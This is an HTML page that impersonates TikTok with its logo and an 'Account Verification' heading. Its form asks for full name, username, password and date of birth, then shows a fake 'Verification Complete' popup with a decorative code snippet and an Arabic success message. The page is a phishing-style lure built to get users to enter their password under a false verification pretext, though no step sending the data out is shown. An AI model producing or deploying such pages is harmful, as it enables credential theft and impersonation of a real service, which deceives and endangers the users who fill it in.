<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verification Portal</title>
  <style>
    :root {
      --primary: #ff0050;
      --bg: #f0f2f5;
      --white: #fff;
      --text: #222;
      --muted: #777;
      --border: #ccc;
      --success: #4CAF50;
    }

    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    body {
      margin: 0;
      padding: 40px 10px;
      background-color: var(--bg);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .form-wrapper {
      background-color: var(--white);
      width: 100%;
      max-width: 400px;
      padding: 30px 25px;
      border-radius: 14px;
      box-shadow: 0 10px 40px rgba(0,0,0,0.1);
      position: relative;
    }

    .form-wrapper img {
      width: 50px;
      display: block;
      margin: 0 auto 15px;
    }

    .form-wrapper h2 {
      font-size: 22px;
      margin-bottom: 10px;
      text-align: center;
      color: var(--text);
    }

    .form-wrapper p {
      font-size: 13px;
      text-align: center;
      color: var(--muted);
      margin-bottom: 25px;
    }

    label {
      display: block;
      font-size: 13px;
      margin-bottom: 4px;
      color: var(--text);
    }

    input {
      width: 100%;
      padding: 10px 12px;
      margin-bottom: 18px;
      border: 1px solid var(--border);
      border-radius: 0;
      background: #fcfcfc;
      font-size: 14px;
    }

    input:focus {
      outline: none;
      border-color: var(--primary);
      background: #fff;
    }

    button {
      width: 100%;
      padding: 12px;
      background-color: var(--primary);
      color: #fff;
      font-size: 15px;
      font-weight: bold;
      border: none;
      cursor: pointer;
      transition: 0.3s;
    }

    button:hover {
      background-color: #e00045;
    }

    .popup {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0, 0, 0, 0.85);
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }

    .popup-content {
      background: #fff;
      padding: 30px;
      max-width: 600px;
      width: 90%;
      border-radius: 12px;
      text-align: center;
      box-shadow: 0 0 60px rgba(0, 0, 0, 0.2);
      animation: fadeIn 0.8s ease-in-out;
    }

    .popup-content h1 {
      font-size: 24px;
      margin-bottom: 20px;
      color: var(--success);
    }

    .popup-content code {
      display: block;
      background: #111;
      color: #0f0;
      text-align: left;
      padding: 20px;
      border-radius: 10px;
      font-family: Consolas, monospace;
      font-size: 13px;
      overflow-x: auto;
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: scale(0.9); }
      to { opacity: 1; transform: scale(1); }
    }
  </style>
</head>
<body>

  <div class="form-wrapper">
    <img src="https://upload.wikimedia.org/wikipedia/en/6/69/TikTok_logo.svg" alt="TikTok Logo">
    <h2>Account Verification</h2>
    <p>Fill the form below to verify your TikTok account.</p>
    <form id="form">
      <label for="name">Full Name</label>
      <input type="text" id="name" placeholder="John Doe" required>

      <label for="user">Username</label>
      <input type="text" id="user" placeholder="@username" required>

      <label for="pass">Password</label>
      <input type="password" id="pass" placeholder="••••••••" required>

      <label for="dob">Date of Birth</label>
      <input type="date" id="dob" required>

      <button type="submit">Submit</button>
    </form>
  </div>

  <div class="popup" id="popup">
    <div class="popup-content">
      <h1>Verification Complete</h1>
      <code>
        // TikTok Verification Code:<br>
        const verified = true;<br>
        const message = "تم توثيق الحساب بنجاح!";<br>
        alert(message);<br>
        location.href = "/welcome";
      </code>
    </div>
  </div>

  <script>
    document.getElementById("form").addEventListener("submit", function(e) {
      e.preventDefault();
      document.getElementById("popup").style.display = "flex";
    });
  </script>
</body>
</html>
